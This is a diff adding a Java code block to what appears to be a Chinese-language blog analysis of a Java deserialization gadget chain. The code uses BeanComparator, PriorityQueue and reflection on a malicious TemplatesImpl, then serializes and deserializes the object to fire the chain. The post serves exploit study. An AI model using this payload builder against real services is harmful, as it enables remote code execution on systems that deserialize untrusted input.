@@ -79,7 +79,30 @@
 
   构造含有恶意字节码的TemplatesImpl的代码见[JDK7u21分析](https://xiaozhicai.github.io/2020/02/20/jdk7u21/)
 
-|  |  |
-| :--- | :--- |
+```java
+TemplatesImpl maliciousTemplatesImpl = (TemplatesImpl) Generator.getTemplateImpl();
+BeanComparator comparator = new BeanComparator("property");
+//comparator.compare(maliciousTemplatesImpl, maliciousTemplatesImpl);
+//使用BeanComparator为中介，ysoserial中使用的是BigInteger
+PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, comparator);
+priorityQueue.add(new BeanComparator("test"));
+priorityQueue.add(new BeanComparator("test"));
+	
+//重修修改BeanComparator的property属性
+comparator.setProperty("outputProperties");
+
+Object [] innerQueue = {maliciousTemplatesImpl,maliciousTemplatesImpl};
+Class PriorityQueueClass = Class.forName("java.util.PriorityQueue");
+Field queue = PriorityQueueClass.getDeclaredField("queue");
+queue.setAccessible(true);
+queue.set(priorityQueue, innerQueue);
+
+String filename = "/beanUtils_payload.ser";
+ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(filename));
+oos.writeObject(priorityQueue);
+ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
+ois.readObject();
+```
+
 
 
